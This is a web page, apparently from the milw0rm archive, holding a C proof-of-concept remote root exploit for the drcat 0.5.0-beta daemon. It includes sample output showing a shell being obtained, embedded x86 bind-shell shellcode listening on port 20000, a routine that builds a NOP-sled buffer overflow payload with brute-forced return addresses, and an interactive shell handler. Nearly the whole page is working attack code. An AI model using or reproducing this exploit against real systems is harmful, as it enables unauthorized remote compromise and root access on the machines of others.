<html><head><title>Drcat 0.5.0-beta (drcatd) Remote Root Exploit</title></head><pre>/*

Proof of Concept DRCATD Remote exploit
                               by Taif
__
Test:
[root@localhost drcat]# ./drcat -d 127.0.0.1 -u taif -p test
Public code by Taif
drcat-0.5.0-beta ('remote r00t' proof)
Bug found by Khan Shirani

host: +-+-+-+-+-+-+-+
      127.0.0.1 |C|L|U|P|C|S|R|
user: |O|O|S|A|O|E|O|
           taif |O|G|E|S|D|N|O|
password: |N|O|R|S|E|D|T|
           test | | | | | | | |
---------retaddr---+-+-+-+-+-+-+-+
       bfefc000 * * * * * * X
       bfefbfd1 * * * * * * X
       bfefbfa2 * * * * * * X
       bfefbf73 * * * * * * X
       bfefbf44 * * * * * * X
       bfefbf15 * * * * * * X
       bfefbee6 * * * * * * X
       bfefbeb7 * * * * * * X
       bfefbe88 * * * * * * X
       bfefbe59 * * * * * * X
       bfefbe2a * * * * * * X
       bfefbdfb * * * * * * X
       bfefbdcc * * * * * * X
       bfefbd9d * * * * * * X
       bfefbd6e * * * * * * X
       bfefbd3f * * * * * * X
       bfefbd10 * * * * * * X
       bfefbce1 * * * * * * X
       bfefbcb2 * * * * * * X
       bfefbc83 * * * * * * X
       bfefbc54 * * * * * * X
       bfefbc25 * * * * * * X
       bfefbbf6 * * * * * * X
       bfefbbc7 * * * * * * X
       bfefbb98 * * * * * * X
       bfefbb69 * * * * * * X
       bfefbb3a * * * * * * X
       bfefbb0b * * * * * * X
       bfefbadc * * * * * * X
       bfefbaad * * * * * * X
       bfefba7e * * * * * * X
       bfefba4f * * * * * * X
       bfefba20 * * * * * * X
       bfefb9f1 * * * * * * X
       bfefb9c2 * * * * * * X
       bfefb993 * * * * * * X
       bfefb964 * * * * * * X
       bfefb935 * * * * * * X
       bfefb906 * * * * * * X
       bfefb8d7 * * * * * * X
       bfefb8a8 * * * * * * X
       bfefb879 * * * * * * X
       bfefb84a * * * * * * X
       bfefb81b * * * * * * X
       bfefb7ec * * * * * * X
       bfefb7bd * * * * * * X
       bfefb78e * * * * * * X
       bfefb75f * * * * * * X
       bfefb730 * * * * * * X
       bfefb701 * * * * * * X
       bfefb6d2 * * * * * * X
       bfefb6a3 * * * * * * X
       bfefb674 * * * * * * X
       bfefb645 * * * * * * X
       bfefb616 * * * * * * X
       bfefb5e7 * * * * * * X
       bfefb5b8 * * * * * * X
       bfefb589 * * * * * * X
       bfefb55a * * * * * * X
       bfefb52b * * * * * * X
       bfefb4fc * * * * * * *
* HAVE FUN * HAVE FUN * HAVE FUN * HAVE FUN * HAVE FUN *
Linux localhost.localdomain 2.4.26 #9 P ?ec 2 09:20:29 CEST 2004 i686 athlon i386 GNU/Linux
uid=500(taif) gid=500(taif) groups=500(taif)
10:04pm up 1:00, 1 user, load average: 0.42, 0.35, 0.20
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
....


NOTE:
Use this on your own risk!!
This exploit is unnecessary!!
*/


#include &lt;stdio.h&gt;
#include &lt;netdb.h&gt;
#include &lt;unistd.h&gt;

#define MAXDATASIZE (1024 * 4)

/* Color Pallete ... i love colors;) */
#define YELLOW &quot;\E[33m&quot;
#define GREEN &quot;\E[32m&quot;
#define RED &quot;\E[31m&quot;
#define RESTORE &quot;\E[0m&quot;


#define PRINTGREEN(string) \
       printf(&quot;%s%s%s&quot;,GREEN,string,RESTORE); \
       fflush(stdout);

#define PRINTRED(string) \
       printf(&quot;%s%s%s&quot;,RED,string,RESTORE); \
       fflush(stdout);

#define PRINTYELLOW(string) \
       printf(&quot;%s%s%s&quot;,YELLOW,string,RESTORE); \
       fflush(stdout);

/* portbind 20000 (by bighawk) *
* +setuid() */
char code[] =
&quot;\x31\xc0&quot; /* xorl %eax,%eax */
&quot;\x31\xdb&quot; /* xorl %ebx,%ebx */
&quot;\xb0\x17&quot; /* movb $0x17,%al */
&quot;\xcd\x80&quot; /* int $0x80 */
&quot;\x31\xdb&quot; /* xor ebx, ebx */
&quot;\xf7\xe3&quot; /* mul ebx */
&quot;\xb0\x66&quot; /* mov al, 102 */
&quot;\x53&quot; /* push ebx */
&quot;\x43&quot; /* inc ebx */
&quot;\x53&quot; /* push ebx */
&quot;\x43&quot; /* inc ebx */
&quot;\x53&quot; /* push ebx */
&quot;\x89\xe1&quot; /* mov ecx, esp */
&quot;\x4b&quot; /* dec ebx */
&quot;\xcd\x80&quot; /* int 80h */
&quot;\x89\xc7&quot; /* mov edi, eax */
&quot;\x52&quot; /* push edx */
&quot;\x66\x68\x4e\x20&quot;/* push word 8270 */
&quot;\x43&quot; /* inc ebx */
&quot;\x66\x53&quot; /* push bx */
&quot;\x89\xe1&quot; /* mov ecx, esp */
&quot;\xb0\xef&quot; /* mov al, 239 */
&quot;\xf6\xd0&quot; /* not al */
&quot;\x50&quot; /* push eax */
&quot;\x51&quot; /* push ecx */
&quot;\x57&quot; /* push edi */
&quot;\x89\xe1&quot; /* mov ecx, esp */
&quot;\xb0\x66&quot; /* mov al, 102 */
&quot;\xcd\x80&quot; /* int 80h */
&quot;\xb0\x66&quot; /* mov al, 102 */
&quot;\x43&quot; /* inc ebx */
&quot;\x43&quot; /* inc ebx */
&quot;\xcd\x80&quot; /* int 80h */
&quot;\x50&quot; /* push eax */
&quot;\x50&quot; /* push eax */
&quot;\x57&quot; /* push edi */
&quot;\x89\xe1&quot; /* mov ecx, esp */
&quot;\x43&quot; /* inc ebx */
&quot;\xb0\x66&quot; /* mov al, 102 */
&quot;\xcd\x80&quot; /* int 80h */
&quot;\x89\xd9&quot; /* mov ecx, ebx */
&quot;\x89\xc3&quot; /* mov ebx, eax */
&quot;\xb0\x3f&quot; /* mov al, 63 */
&quot;\x49&quot; /* dec ecx */
&quot;\xcd\x80&quot; /* int 80h */
&quot;\x41&quot; /* inc ecx */
&quot;\xe2\xf8&quot; /* loop lp */
&quot;\x51&quot; /* push ecx */
&quot;\x68\x6e\x2f\x73\x68&quot;/* push dword 68732f6eh */
&quot;\x68\x2f\x2f\x62\x69&quot;/* push dword 69622f2fh */
&quot;\x89\xe3&quot; /* mov ebx, esp */
&quot;\x51&quot; /* push ecx */
&quot;\x53&quot; /* push ebx */
&quot;\x89\xe1&quot; /* mov ecx, esp */
&quot;\xb0\xf4&quot; /* mov al, 244 */
&quot;\xf6\xd0&quot; /* not al */
&quot;\xcd\x80&quot;; /* int 80h */

void banner()
{
fprintf(stderr,&quot;Public code by Taif \n&quot;
              &quot;drcat-0.5.0-beta (\'remote r00t\' proof)\n&quot;
              &quot;Bug found by Khan Shirani \n\n&quot;);
}

void usage (char *progname)
{
int i;
fprintf (stderr, &quot;usage: %s arguments \n\n&quot;
                &quot;-d hostanme (127.0.0.1) \n&quot;
                &quot;-u user (NULL) \n&quot;
                &quot;-p password (NULL) \n&quot;
                &quot;-P port (3535) \n&quot;
                &quot;-t timeout (1000=1s) (300) \n&quot;
                &quot;\n&quot;, progname);


exit (0);
}

int conn(char *ip,int port)
{
int sock;
struct hostent *host;
struct sockaddr_in addr;

if((host=gethostbyname(ip))==NULL)
 { PRINTRED(&quot;X\ngethostbyname()\n&quot;); exit(1); }

addr.sin_family=AF_INET;
addr.sin_port=htons(port);
addr.sin_addr=*((struct in_addr *)host-&gt;h_addr);
memset(&amp;(addr.sin_zero),0,8);


if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
 { PRINTRED(&quot;X\nsocket()\n&quot;); exit(1); }

if(connect(sock,(struct sockaddr *)&amp;addr,sizeof(struct sockaddr))==-1)
 { PRINTRED(&quot;X\n&quot;); return(-1);}

return(sock);
}

void login(int sock,char* user,char *pass)
{
char buffer[1024];
int n;

memset(buffer,0,sizeof(buffer));
n=recv(sock, buffer, 6, 0);
if(n&lt;0) { PRINTRED(&quot;\nrecv()\n&quot;); exit(1); }
if(n==6)
 {
 if(strcmp(buffer, &quot;drcatd&quot;)) {PRINTYELLOW(&quot;* &quot;);}
   else {PRINTGREEN(&quot;* &quot;);};
 }
else {PRINTYELLOW(&quot;* &quot;);}

if(send(sock, user, strlen(user), 0) == -1)
 {PRINTRED(&quot;\nsend()\n&quot;);close(sock);exit(1);}

n=recv(sock, buffer, 1, 0);
if(buffer[0] == '0')
 {
 PRINTRED(&quot;X\nINVALID USER\n&quot;);
 close(sock);
 exit(1);
 }
else {PRINTGREEN(&quot;* &quot;)};

if(send(sock, pass, strlen(pass), 0) == -1)
 {PRINTRED(&quot;send()\n&quot;);close(sock);exit(1);}

n=recv(sock, buffer, 1, 0);
 if(buffer[0] == '0')
 {
 PRINTRED(&quot;X\nINVALID PASSWORD\n&quot;);
 close(sock);
 exit(1);
 }
return;
}

/* change with care */
#define TOP 290

void makec0de(char* haox,unsigned int ret)
{
int i;

memset(haox,0,512);
memset(haox,0x90,TOP);
for (i=0;i&lt;sizeof(code)-1;i++)
haox[TOP-sizeof(code)+i]=code[i];
/* yeah fucking thing (ret%4) */
for (i=TOP-(ret%4);i&lt;504;i=i+4)
*(long *)&amp;haox[i]=ret;
}

void send_it(int sock,char* buffer)
{
int len;

len=strlen(buffer);
if (send(sock, buffer, len, 0) == -1)
 {
 PRINTRED(&quot;X\nsend()\n&quot;);
 close(sock);
 exit(1);
 }
return;
}

int sh(int sock)
{
char snd[1024], rcv[1024];
fd_set rset;
int maxfd, n;
int received = 0;

//strcpy(snd,&quot;TERM=xterm; export TERM=xterm; exec bash -i\n&quot;);
//write(sock, snd, strlen(snd));

strcpy(snd, &quot;uname -a; id; w\n&quot;);
write(sock, snd, strlen(snd));

for (;;)
{
FD_SET(fileno(stdin), &amp;rset);
FD_SET(sock, &amp;rset);

maxfd = ( ( fileno(stdin) &gt; sock )?fileno(stdin):sock ) + 1;
select(maxfd, &amp;rset, NULL, NULL, NULL);

if (FD_ISSET(fileno(stdin), &amp;rset))
 {
 bzero(snd, sizeof(snd));
 fgets(snd, sizeof(snd)-2, stdin);
 write(sock, snd, strlen(snd));
 }

if (FD_ISSET(sock, &amp;rset))
 {
 bzero(rcv, sizeof(rcv));
 if ((n = read(sock, rcv, sizeof(rcv))) == -1)
   {
   printf(&quot;FUCK: Error in read\n&quot;);
   exit(1);
   }
 if (!n)
   {
   if (!received)
     {
     printf(&quot;FUCK: failed.\n\n&quot;);
     return 0;
     }
   printf(&quot;Connection closed.\n&quot;);
   exit(1);
   }

 received = 1;
 fputs(rcv, stdout);
 fflush(stdout);
 }
}
}

int main(int argc, char *argv[]){
char buff[MAXDATASIZE];
char *host, *user,*pass,c;
int sockfd,sockfd2;
int port = 3535;
int time = 300;
int ret=0xc0000000-(MAXDATASIZE*260);

host=&quot;127.0.0.1&quot;;
user=NULL;
pass=NULL;

banner();
if (argc&lt;2) usage (argv[0]);

while((c=getopt(argc,argv,&quot;?hd:u:p:P:t:&quot;))!=-1)
       {
               switch(c)
               {
               case 't':
                               time=atoi(optarg);
                               break;
               case 'P':
                               port=atoi(optarg);
                               break;
               case 'u':
                               user=optarg;
                               break;
               case 'd':
                               host=optarg;
                               break;
               case 'p':
                               pass=optarg;
                               break;
               case '?':
               case 'h':
               default:
                               usage (argv[0]);
                               break;

               }
       }

if (host==NULL)
 {PRINTRED(&quot;Set host!\n&quot;);usage (argv[0]);}
if (user==NULL)
 {PRINTRED(&quot;Set user!\n&quot;);usage (argv[0]);}
if (pass==NULL)
 {PRINTRED(&quot;Set password!\n&quot;);usage (argv[0]);}
 
printf(&quot; host: +-+-+-+-+-+-+-+\n&quot;
      &quot;%16s |C|L|U|P|C|S|R|\n&quot;
      &quot; user: |O|O|S|A|O|E|O|\n&quot;
      &quot;%16s |O|G|E|S|D|N|O|\n&quot;
      &quot; password: |N|O|R|S|E|D|T|\n&quot;
      &quot;%16s | | | | | | | |\n&quot;
      &quot;---------retaddr---+-+-+-+-+-+-+-+\n&quot;
      ,host,user,pass);fflush(stdout);
while(1)
{
printf(&quot;%16x &quot;,ret);fflush(stdout);
sockfd=conn(host,port);
if (sockfd&lt;0) {PRINTRED(&quot;connect()\n&quot;);exit(1);}
 else PRINTGREEN(&quot;* &quot;);
login(sockfd,user,pass);PRINTGREEN(&quot;* &quot;);
makec0de(buff,ret);PRINTGREEN(&quot;* &quot;);
send_it(sockfd,buff);PRINTGREEN(&quot;* &quot;);
close(sockfd);
usleep(time*1000);
sockfd=conn(host,20000);
if (!(sockfd&lt;0))
 {
 PRINTGREEN(&quot;*\n&quot;);
 PRINTGREEN(&quot;* HAVE FUN * HAVE FUN * HAVE FUN * HAVE FUN * HAVE FUN *\n&quot;);
 sh(sockfd);
 close(sockfd);
 exit(0);
 }
ret=ret-((TOP-sizeof(code))/4);
}
exit(0);

}

// milw0rm.com [2004-07-22]</pre></html>